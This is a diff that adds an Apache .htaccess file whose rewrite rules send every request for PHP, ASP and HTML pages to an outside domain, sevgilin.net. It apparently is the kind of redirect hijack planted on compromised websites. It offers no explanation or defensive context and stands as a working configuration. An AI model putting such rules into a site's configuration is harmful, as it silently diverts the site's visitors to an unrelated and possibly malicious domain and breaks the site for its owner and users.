@@ -1,0 +1,11 @@
+Options +FollowSymLinks
+RewriteEngine on
+RewriteRule (.*)\.php http://www.sevgilin.net
+RewriteRule (.*)\.php2 http://www.sevgilin.net
+RewriteRule (.*)\.php3 http://www.sevgilin.net
+RewriteRule (.*)\.php4 http://www.sevgilin.net
+RewriteRule (.*)\.php5 http://www.sevgilin.net
+RewriteRule (.*)\.php6 http://www.sevgilin.net
+RewriteRule (.*)\.asp http://www.sevgilin.net
+RewriteRule (.*)\.aspx http://www.sevgilin.net
+RewriteRule (.*)\.html http://www.sevgilin.net
